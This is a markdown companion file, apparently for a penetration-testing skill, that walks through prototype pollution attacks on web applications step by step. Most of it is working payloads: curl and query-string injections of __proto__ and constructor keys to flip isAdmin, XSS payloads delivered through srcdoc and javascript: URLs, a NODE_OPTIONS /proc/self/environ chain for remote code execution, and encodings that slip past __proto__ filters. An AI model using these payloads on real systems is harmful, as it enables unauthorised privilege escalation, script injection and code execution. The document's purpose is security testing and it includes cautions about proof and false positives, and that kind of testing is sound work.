# Prototype Pollution — Deep Workflows

Companion to SKILL.md. Sink discovery, gadget chaining, escalation.

## Step 1: Server-side pollution entry points

```bash
# Merge-style body parsers accept __proto__/constructor/prototype keys:
curl -X POST https://target.example.com/api/profile -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true}}'
-d '{"constructor":{"prototype":{"isAdmin":true}}}'   # bypass when __proto filtered
# Nested arrays/qs parsing:
GET /search?__proto__[admin]=1
GET /search?__proto__[admin][x]=1
# Query-string lib variants (qs deep=true era bugs):
?a[b][c][__proto__][polluted]=yes
```

Detection trick — pollute a harmless observable:

```json
{"__proto__":{"status":555}}
{"__proto__":{"statusCode":555}}
{"__proto__":{"body":"POLLUTED_PROOF"}}
```
Then request ANY endpoint whose behavior shifts (error pages, JSON
serialization defaults). A changed global default = confirmed pollution.

## Step 2: Client-side sink hunting

```bash
# Grep bundles for merge patterns:
grep -rEn "Object\.assign\(\s*\{\s*\}\s*,|merge\(|defaultsDeep|_.extend\(" app.js
# Known dangerous libs (historical classes): lodash <4.17.12 set/merge,
# jquery $.extend(true,...), hoek, deepmerge misconfigurations.

# URL param to client merge:
https://target.example.com/?__proto__[srcdoc]=<script>alert(1)</script>
https://target.example.com/?__proto__[URL]=javascript:alert(1)
```

## Step 3: Gadget identification

A gadget = code path reading an undefined property that now inherits your
value. Systematic sweep:

```text
1. Pollute candidate key with marker value.
2. Exercise every major flow (login, checkout, render).
3. Diff behavior/responses.
High-yield gadget keys:
  isAdmin role permissions admin
  status statusCode body message error
  host hostname baseURL url src href action
  env NODE_OPTIONS (server RCE class, documented technique)
  shell lang LANG LC_ALL (child_process spawn env)
  exiftool options / pdfkit options (documented RCE gadgets)
```

## Step 4: Escalation chains

```text
Pollution -> XSS:
  {"__proto__":{"srcdoc":"<script>alert(1)</script>"}} on iframe-rendering pages
Pollution -> authz flip:
  {"__proto__":{"isAdmin":true}} then hit admin API; verify server checks
  actually read polluted object (many check session instead -> no impact)
Pollution -> RCE (documented Node gadget):
  NODE_OPTIONS=--require=/proc/self/environ style chains; prove ONLY via
  harmless side effect (DNS callback), never drop payloads.
```

Server-side RCE claims require OOB proof from target egress.

## Step 5: Bypass patterns when `__proto__` is stripped

```text
constructor.prototype      nested form
const/Constructor case variants
JSON array nesting:        {"a":{"b":{"__proto__":{...}}}} depth-dependent strips
Unicode escapes in JSON:   "\u005f\u005fproto__"
Prototype alias:           ["__proto__"] bracket syntax in qs
```

## False-positive elimination

1. Confirm pollution is GLOBAL (affects second unrelated endpoint), not
   just local object assignment.
2. For client-side, confirm in clean browser profile (extensions pollute).
3. Impact must be demonstrated through a real gadget — "key accepted"
   alone is not a finding.
